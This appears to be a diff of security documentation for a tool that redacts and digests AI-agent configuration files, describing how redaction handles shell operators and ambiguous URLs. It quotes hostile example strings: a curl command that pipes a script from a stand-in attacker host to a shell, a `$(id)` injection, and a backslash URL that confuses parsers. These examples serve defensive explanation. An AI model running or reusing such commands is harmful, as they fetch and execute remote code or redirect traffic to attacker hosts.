@@ -331,14 +331,35 @@ Copilot files always cover the file after the standard
 [redaction](security-model.md#known-false-positive-and-false-negative-classes), with
 `env` names but not their values: a URL keeps only its scheme, host and port, and a
 credential in an assignment, after an authorization scheme or in a known token format
-is removed. Keys are redacted the same way, so of two entries whose keys differ only in
+is removed. The redaction is applied separately to the text between the shell
+operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
+which are kept, so a URL or an assigned value ends at the first of them: a command,
+an operator or a host written after one without white space, such as
+`https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
+covered. Each URL scheme in such a text also starts a new part, so every URL keeps
+its own host whatever separates it from the text before it, such as the second host
+in `--webhooks=https://hooks.example/n,https://evil.example/x` or the host assigned to
+a credential-named option such as `--token-url=https://auth.example/t`;
+other text glued to a URL without an operator or another scheme remains part of that
+URL's redacted path. A redacted value that itself contains one of these characters,
+or a scheme followed by `://`, such as a URL query parameter after `&` or a
+`?to=https://other.example` redirect target, is covered from that character or
+scheme on. Without the key, a
+file holding a URL whose authority URL parsers read differently (a backslash in it, such as
+`https://attacker.example\@corp.example`, which urlsplit reads as `corp.example` and
+WHATWG parsers such as Codex's as `attacker.example`, or an `http`, `https`, `ws`,
+`wss` or `ftp` URL with an empty authority) is a failure that names the file, gets no
+digest and fails the scan gate, as the `mcp` collector refuses such an endpoint; with
+the key, the keyed binding covers its host. Keys
+are redacted the same way, so of two entries whose keys differ only in
 what the redaction removes, the digest covers the last one in the file. Anyone holding
 the BOM therefore cannot confirm a guess of a value the
 redaction removes, such as the environment value of an MCP server that
 `.codex/config.toml` declares, which the `mcp` record withholds too. The cost is that
 without the key a change to such a value alone, such as a new token or URL path on
 the same host in a `notify` command such as
-`TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged. Without
+`TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
+then carries a low `completeness` finding that names the key. Without
 `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` the digests of the other files cover the file as
 read, so any changed value changes the record, and anyone holding the BOM can confirm
 a guess of a whole settings file, including the environment values of the MCP servers
